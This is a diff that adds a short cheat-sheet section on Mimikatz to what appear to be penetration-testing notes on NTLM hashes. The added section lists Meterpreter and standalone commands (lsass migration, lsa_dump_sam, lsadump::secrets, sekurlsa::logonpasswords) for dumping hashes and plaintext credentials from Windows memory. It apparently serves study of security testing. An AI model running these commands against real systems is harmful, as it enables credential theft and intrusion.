@@ -21,4 +21,25 @@ NTLM (NT Hash)
      2. Case Sensitive
      3. Allows the use of symbols and unicode
    
-     
+**Mimikatz**
+
+De-facto standard for hash extraction from memory. Can steal clear text creds, hashes, and kerberos tickets from memory.
+
+Kali and Parrot comes with precompiled mimikatz, or you can utilize kiwi from Meterpreter session. Runs with system privs, so you must escalate privs prior to utilizing.
+
+From Meterpreter Shell:
+
+ - pgrep lsass.exe
+ - migrate < PID >
+ - load kiwi
+ - lsa_dump_sam ( will provide you with hashes along with syskey for cracking )
+
+**Without Meterpreter**
+
+Compiled copy stored under /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
+
+privelege::debug ( if you return a result of 20 you have perms for memory hash dump )
+
+lsadump::sam ( dumps hashes )
+lsadump::secrets
+sekurlsa::logonpasswords ( will reveal plaintext passwords if they are configured to be stored in memory ) 
